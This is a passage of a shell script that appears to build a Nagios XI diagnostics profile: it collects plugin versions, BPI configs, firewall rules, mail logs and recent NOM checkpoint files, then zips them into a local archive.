su -s /bin/bash nagios -c "/usr/local/nagios/libexec/check_ping --version" > "/usr/local/nagiosxi/var/components/profile/$folder/versions/nagios-plugins.txt"

echo "Getting BPI configs..."
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/bpi/"
cp /usr/local/nagiosxi/etc/components/bpi.conf* "/usr/local/nagiosxi/var/components/profile/$folder/bpi/"

echo "Getting Firewall information..."

if which iptables >/dev/null 2>&1; then
    echo "iptables -S" > "/usr/local/nagiosxi/var/components/profile/$folder/iptables.txt"
    echo "-----------" >> "/usr/local/nagiosxi/var/components/profile/$folder/iptables.txt"
    iptables -S >> "/usr/local/nagiosxi/var/components/profile/$folder/iptables.txt" 2>&1
fi


if which firewall-cmd >/dev/null 2>&1; then
    echo "firewall-cmd --list-all-zones" > "/usr/local/nagiosxi/var/components/profile/$folder/firewalld.txt"
    echo "-----------" >> "/usr/local/nagiosxi/var/components/profile/$folder/firewalld.txt"
    firewall-cmd --list-all-zones >> "/usr/local/nagiosxi/var/components/profile/$folder/firewalld.txt" 2>&1
fi


if which ufw >/dev/null 2>&1; then
    echo "ufw status" > "/usr/local/nagiosxi/var/components/profile/$folder/ufw.txt"
    echo "-----------" >> "/usr/local/nagiosxi/var/components/profile/$folder/ufw.txt"
    ufw status >> "/usr/local/nagiosxi/var/components/profile/$folder/ufw.txt" 2>&1
fi

echo "Getting maillog..."
tail -100 /var/log/maillog > "/usr/local/nagiosxi/var/components/profile/$folder/maillog"

echo "Getting phpmailer.log..."
if [ -f /usr/local/nagiosxi/tmp/phpmailer.log ]; then
    tail -100 /usr/local/nagiosxi/tmp/phpmailer.log > "/usr/local/nagiosxi/var/components/profile/$folder/phpmailer.log"
fi

echo "Getting nom data..."
error_txt=$(ls -t /usr/local/nagiosxi/nom/checkpoints/nagioscore/errors/*.txt | head -n 1)
error_tar_gz=$(ls -t /usr/local/nagiosxi/nom/checkpoints/nagioscore/errors/*.tar.gz | head -n 1)
sql_gz=$(ls -t /usr/local/nagiosxi/nom/checkpoints/nagiosxi/*.sql.gz | head -n 1)

mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/nom/"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/nom/checkpoints/nagioscore/"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/nom/checkpoints/nagiosxi/"
mkdir -p "/usr/local/nagiosxi/var/components/profile/$folder/nom/checkpoints/nagioscore/errors/"

cp -rf "$error_txt" "/usr/local/nagiosxi/var/components/profile/$folder/nom/checkpoints/nagioscore/errors/"
cp -rf "$error_tar_gz" "/usr/local/nagiosxi/var/components/profile/$folder/nom/checkpoints/nagioscore/errors/"
cp -rf "$sql_gz" "/usr/local/nagiosxi/var/components/profile/$folder/nom/checkpoints/nagiosxi/"

echo "Zipping logs directory..."

## temporarily change to that directory, zip, then leave
(
    ts=$(date +%s)
    cd /usr/local/nagiosxi/var/components/profile
    mv "$folder" "profile-$ts"
    zip -r profile.zip "profile-$ts"
    rm -rf "profile-$ts"
    mv -f profile.zip ../
)

echo "Backup and Zip complete!"
```